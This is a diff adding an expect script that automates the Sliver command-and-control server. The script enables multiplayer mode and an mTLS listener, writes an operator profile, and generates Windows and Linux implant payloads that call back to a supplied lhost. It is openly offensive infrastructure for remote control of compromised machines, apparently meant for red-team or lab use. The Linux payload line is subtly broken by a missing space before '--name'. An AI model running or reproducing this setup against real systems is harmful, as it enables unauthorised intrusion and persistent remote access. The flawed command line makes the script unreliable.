@@ -1,0 +1,40 @@
+#!/usr/bin/expect -f
+
+# Disable the timeout to wait indefinitely for a response
+set timeout -1
+
+# Define the prompt that sliver-server uses
+set prompt "[server] sliver > "
+
+# Get the first argument passed to the script
+set lhost [lindex $argv 0]
+set local_mount [lindex $argv 1]
+
+# Start sliver-server
+spawn sliver-server
+
+# Wait for the initial prompt
+expect -re $prompt
+
+# Send the 'multiplayer' command
+send "multiplayer\r"
+expect -re $prompt
+
+# Send the 'mtls' command
+send "mtls\r"
+expect -re $prompt
+
+# Send the 'new-operator' command with the provided lhost
+send "new-operator --name operator --save $local_mount/sliver/profile/operator.cfg --lhost $lhost\r"
+expect -re $prompt
+
+# Generate the Windows payload
+send "generate --os windows --mtls $lhost --name windows_agent --save $local_mount/sliver/payloads\r"
+expect -re $prompt
+
+# Generate the Linux payload
+send "generate --os linux --mtls $lhost--name linux_agent --save $local_mount/sliver/payloads\r"
+expect -re $prompt
+
+# Keep the session open for further interaction
+interact
